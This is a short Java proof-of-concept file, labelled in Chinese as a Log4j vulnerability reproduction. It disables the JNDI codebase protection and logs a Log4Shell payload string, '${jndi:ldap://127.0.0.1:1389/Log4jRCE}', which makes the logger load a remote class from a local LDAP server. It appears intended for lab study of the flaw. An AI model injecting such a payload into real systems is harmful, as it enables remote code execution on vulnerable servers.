package Log4jTest;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * log4j 漏洞复现
 *
 */
public class Log4jHack
{
    private static final Logger logger = LogManager.getLogger(Log4jHack.class);
    public static void main( String[] args )
    {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("${jndi:ldap://127.0.0.1:1389/Log4jRCE}");
    }
}
